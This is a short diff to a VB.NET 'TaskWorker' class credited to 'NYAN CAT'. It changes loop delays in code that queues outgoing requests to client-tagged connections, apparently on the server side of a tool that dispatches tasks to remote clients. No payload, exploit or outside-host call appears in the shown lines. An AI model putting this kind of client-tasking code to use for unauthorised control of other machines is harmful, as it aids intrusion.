@@ -1,6 +1,5 @@
 ﻿
 '       │ Author     : NYAN CAT
-'       │ Name       : Task scheduler
 
 '       Contact Me   : https://github.com/NYAN-x-CAT
 
@@ -38,7 +37,6 @@ Public Class TaskWorker
                                     Dim ClientReq As New Outcoming_Requests(x.Tag, B)
                                     Pending.Req_Out.Add(ClientReq)
                                 End If
-                                Await Threading.Tasks.Task.Delay(1)
                             Next
                             Exit For
                         End If
@@ -50,9 +48,8 @@ Public Class TaskWorker
                 Catch ex As Exception
                     Debug.WriteLine("Task " + ex.Message)
                 End Try
-
+                Await Threading.Tasks.Task.Delay(30 * 1000)
             End If
-            Await Threading.Tasks.Task.Delay(10 * 1000)
         End While
     End Sub
 
